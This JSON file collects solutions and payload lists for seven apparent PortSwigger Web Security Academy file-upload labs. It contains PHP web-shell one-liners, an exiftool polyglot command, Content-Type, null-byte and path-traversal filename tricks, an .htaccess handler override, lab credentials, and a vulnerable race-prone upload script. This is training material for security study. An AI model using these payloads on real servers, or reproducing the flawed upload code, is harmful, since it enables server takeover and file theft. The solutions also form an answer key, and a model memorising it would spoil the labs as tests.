[
  {
    "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload",
    "category": "file-upload",
    "title": "Remote code execution via polyglot web shell upload",
    "description": "This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.",
    "solution_steps": [
      "On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>",
      "Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.",
      "Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows: exiftool -Comment=\"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>\" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.",
      "In the browser, upload the polyglot image as your avatar, then go back to your account page.",
      "In Burp's proxy history, find the GET /files/avatars/polyglot.php request. Use the message editor's search feature to find the START string somewhere within the binary image data in the response. Between this and the END string, you should see Carlos's secret, for example: START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END",
      "Submit the secret to solve the lab."
    ],
    "solution": "1. On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>\n2. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.\n3. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows: exiftool -Comment=\"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>\" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.\n4. In the browser, upload the polyglot image as your avatar, then go back to your account page.\n5. In Burp's proxy history, find the GET /files/avatars/polyglot.php request. Use the message editor's search feature to find the START string somewhere within the binary image data in the response. Between this and the END string, you should see Carlos's secret, for example: START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END\n6. Submit the secret to solve the lab.",
    "payloads": [
      "/home/carlos/secret",
      "wiener:peter",
      "exploit.php",
      "<?php echo file_get_contents('/home/carlos/secret'); ?>",
      "exiftool -Comment=\"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>\" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php",
      "Comment",
      ".php",
      "GET /files/avatars/polyglot.php",
      "START",
      "START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload",
    "category": "file-upload",
    "title": "Remote code execution via web shell upload",
    "description": "This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.",
    "solution_steps": [
      "While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.",
      "Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.",
      "In Burp, go to Proxy > HTTP history . Click the filter bar to open the HTTP history filter window. Under Filter by MIME type , enable the Images checkbox, then apply your changes.",
      "In the proxy history, notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.",
      "On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret file. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>",
      "Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.",
      "In Burp Repeater, change the path of the request to point to your PHP file: GET /files/avatars/exploit.php HTTP/1.1",
      "Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.",
      "Submit the secret to solve the lab."
    ],
    "solution": "1. While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.\n2. Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.\n3. In Burp, go to Proxy > HTTP history . Click the filter bar to open the HTTP history filter window. Under Filter by MIME type , enable the Images checkbox, then apply your changes.\n4. In the proxy history, notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.\n5. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret file. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>\n6. Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.\n7. In Burp Repeater, change the path of the request to point to your PHP file: GET /files/avatars/exploit.php HTTP/1.1\n8. Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.\n9. Submit the secret to solve the lab.",
    "payloads": [
      "/home/carlos/secret",
      "wiener:peter",
      "/files/avatars/<YOUR-IMAGE>",
      "exploit.php",
      "<?php echo file_get_contents('/home/carlos/secret'); ?>",
      "GET /files/avatars/exploit.php HTTP/1.1"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass",
    "category": "file-upload",
    "title": "Web shell upload via Content-Type restriction bypass",
    "description": "This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.",
    "solution_steps": [
      "Log in and upload an image as your avatar, then go back to your account page.",
      "In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.",
      "On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>",
      "Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type image/jpeg or image/png .",
      "In Burp, go back to the proxy history and find the POST /my-account/avatar request that was used to submit the file upload. Send this to Burp Repeater.",
      "In Burp Repeater, go to the tab containing the POST /my-account/avatar request. In the part of the message body related to your file, change the specified Content-Type to image/jpeg .",
      "Send the request. Observe that the response indicates that your file was successfully uploaded.",
      "Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that Carlos's secret was returned in the response.",
      "Submit the secret to solve the lab."
    ],
    "solution": "1. Log in and upload an image as your avatar, then go back to your account page.\n2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.\n3. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>\n4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type image/jpeg or image/png .\n5. In Burp, go back to the proxy history and find the POST /my-account/avatar request that was used to submit the file upload. Send this to Burp Repeater.\n6. In Burp Repeater, go to the tab containing the POST /my-account/avatar request. In the part of the message body related to your file, change the specified Content-Type to image/jpeg .\n7. Send the request. Observe that the response indicates that your file was successfully uploaded.\n8. Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that Carlos's secret was returned in the response.\n9. Submit the secret to solve the lab.",
    "payloads": [
      "/home/carlos/secret",
      "wiener:peter",
      "/files/avatars/<YOUR-IMAGE>",
      "exploit.php",
      "<?php echo file_get_contents('/home/carlos/secret'); ?>",
      "image/jpeg",
      "image/png",
      "POST /my-account/avatar",
      "Content-Type",
      "GET /files/avatars/<YOUR-IMAGE>"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass",
    "category": "file-upload",
    "title": "Web shell upload via extension blacklist bypass",
    "description": "This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.",
    "solution": "You need to upload two different files to solve this lab.",
    "payloads": [
      "/home/carlos/secret",
      "wiener:peter",
      "/files/avatars/<YOUR-IMAGE>",
      "exploit.php",
      "<?php echo file_get_contents('/home/carlos/secret'); ?>",
      ".php",
      "POST /my-account/avatar",
      "filename",
      ".htaccess",
      "Content-Type",
      "text/plain",
      "AddType application/x-httpd-php .l33t",
      ".l33t",
      "application/x-httpd-php",
      "mod_php"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension",
    "category": "file-upload",
    "title": "Web shell upload via obfuscated file extension",
    "description": "This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.",
    "solution_steps": [
      "Log in and upload an image as your avatar, then go back to your account page.",
      "In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.",
      "On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>",
      "Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload JPG and PNG files.",
      "In Burp's proxy history, find the POST /my-account/avatar request that was used to submit the file upload. Send this to Burp Repeater.",
      "In Burp Repeater, go to the tab for the POST /my-account/avatar request and find the part of the body that relates to your PHP file. In the Content-Disposition header, change the value of the filename parameter to include a URL encoded null byte, followed by the .jpg extension: filename=\"exploit.php%00.jpg\"",
      "Send the request and observe that the file was successfully uploaded. Notice that the message refers to the file as exploit.php , suggesting that the null byte and .jpg extension have been stripped.",
      "Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that Carlos's secret was returned in the response.",
      "Submit the secret to solve the lab."
    ],
    "solution": "1. Log in and upload an image as your avatar, then go back to your account page.\n2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.\n3. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>\n4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload JPG and PNG files.\n5. In Burp's proxy history, find the POST /my-account/avatar request that was used to submit the file upload. Send this to Burp Repeater.\n6. In Burp Repeater, go to the tab for the POST /my-account/avatar request and find the part of the body that relates to your PHP file. In the Content-Disposition header, change the value of the filename parameter to include a URL encoded null byte, followed by the .jpg extension: filename=\"exploit.php%00.jpg\"\n7. Send the request and observe that the file was successfully uploaded. Notice that the message refers to the file as exploit.php , suggesting that the null byte and .jpg extension have been stripped.\n8. Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that Carlos's secret was returned in the response.\n9. Submit the secret to solve the lab.",
    "payloads": [
      "/home/carlos/secret",
      "wiener:peter",
      "/files/avatars/<YOUR-IMAGE>",
      "exploit.php",
      "<?php echo file_get_contents('/home/carlos/secret'); ?>",
      "POST /my-account/avatar",
      "Content-Disposition",
      "filename",
      ".jpg",
      "filename=\"exploit.php%00.jpg\"",
      "GET /files/avatars/<YOUR-IMAGE>"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal",
    "category": "file-upload",
    "title": "Web shell upload via path traversal",
    "description": "This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting asecondary vulnerability.",
    "solution_steps": [
      "Log in and upload an image as your avatar, then go back to your account page.",
      "In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.",
      "On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>",
      "Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files.",
      "In Burp Repeater, go to the tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.",
      "In Burp's proxy history, find the POST /my-account/avatar request that was used to submit the file upload and send it to Burp Repeater.",
      "In Burp Repeater, go to the tab containing the POST /my-account/avatar request and find the part of the request body that relates to your PHP file. In the Content-Disposition header, change the filename to include a directory traversal sequence: Content-Disposition: form-data; name=\"avatar\"; filename=\"../exploit.php\"",
      "Send the request. Notice that the response says The file avatars/exploit.php has been uploaded. This suggests that the server is stripping the directory traversal sequence from the file name.",
      "Obfuscate the directory traversal sequence by URL encoding the forward slash ( / ) character, resulting in: filename=\"..%2fexploit.php\"",
      "Send the request and observe that the message now says The file avatars/../exploit.php has been uploaded. This indicates that the file name is being URL decoded by the server.",
      "In the browser, go back to your account page.",
      "In Burp's proxy history, find the GET /files/avatars/..%2fexploit.php request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy ( /files ), and subsequently executed by the server. Note that this means you can also request this file using GET /files/exploit.php .",
      "Submit the secret to solve the lab."
    ],
    "solution": "1. Log in and upload an image as your avatar, then go back to your account page.\n2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.\n3. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>\n4. Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files.\n5. In Burp Repeater, go to the tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.\n6. In Burp's proxy history, find the POST /my-account/avatar request that was used to submit the file upload and send it to Burp Repeater.\n7. In Burp Repeater, go to the tab containing the POST /my-account/avatar request and find the part of the request body that relates to your PHP file. In the Content-Disposition header, change the filename to include a directory traversal sequence: Content-Disposition: form-data; name=\"avatar\"; filename=\"../exploit.php\"\n8. Send the request. Notice that the response says The file avatars/exploit.php has been uploaded. This suggests that the server is stripping the directory traversal sequence from the file name.\n9. Obfuscate the directory traversal sequence by URL encoding the forward slash ( / ) character, resulting in: filename=\"..%2fexploit.php\"\n10. Send the request and observe that the message now says The file avatars/../exploit.php has been uploaded. This indicates that the file name is being URL decoded by the server.\n11. In the browser, go back to your account page.\n12. In Burp's proxy history, find the GET /files/avatars/..%2fexploit.php request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy ( /files ), and subsequently executed by the server. Note that this means you can also request this file using GET /files/exploit.php .\n13. Submit the secret to solve the lab.",
    "payloads": [
      "/home/carlos/secret",
      "wiener:peter",
      "/files/avatars/<YOUR-IMAGE>",
      "exploit.php",
      "<?php echo file_get_contents('/home/carlos/secret'); ?>",
      "GET /files/avatars/<YOUR-IMAGE>",
      "POST /my-account/avatar",
      "Content-Disposition",
      "filename",
      "Content-Disposition: form-data; name=\"avatar\"; filename=\"../exploit.php\"",
      "The file avatars/exploit.php has been uploaded.",
      "filename=\"..%2fexploit.php\"",
      "The file avatars/../exploit.php has been uploaded.",
      "GET /files/avatars/..%2fexploit.php",
      "/files"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition",
    "category": "file-upload",
    "title": "Web shell upload via race condition",
    "description": "This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.",
    "solution": "The vulnerable code that introduces this race condition is as follows:\n<?php\n$target_dir = \"avatars/\";\n$target_file = $target_dir . $_FILES[\"avatar\"][\"name\"];\n\n// temporary move\nmove_uploaded_file($_FILES[\"avatar\"][\"tmp_name\"], $target_file);\n\nif (checkViruses($target_file) && checkFileType($target_file)) {\n    echo \"The file \". htmlspecialchars( $target_file). \" has been uploaded.\";\n} else {\n    unlink($target_file);\n    echo \"Sorry, there was an error uploading your file.\";\n    http_response_code(403);\n}\n\nfunction checkViruses($fileName) {\n    // checking for viruses\n    ...\n}\n\nfunction checkFileType($fileName) {\n    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));\n    if($imageFileType != \"jpg\" && $imageFileType != \"png\") {\n        echo \"Sorry, only JPG & PNG files are allowed\\n\";\n        return false;\n    } else {\n        return true;\n    }\n}\n?>",
    "payloads": [
      "/home/carlos/secret",
      "wiener:peter",
      "/files/avatars/<YOUR-IMAGE>",
      "exploit.php",
      "<?php echo file_get_contents('/home/carlos/secret'); ?>",
      "POST /my-account/avatar",
      "<YOUR-POST-REQUEST>",
      "<YOUR-GET-REQUEST>",
      "GET /files/avatars/<YOUR-IMAGE>",
      "POST",
      "/files/avatars/exploit.php",
      "\\r\\n\\r\\n"
    ]
  }
]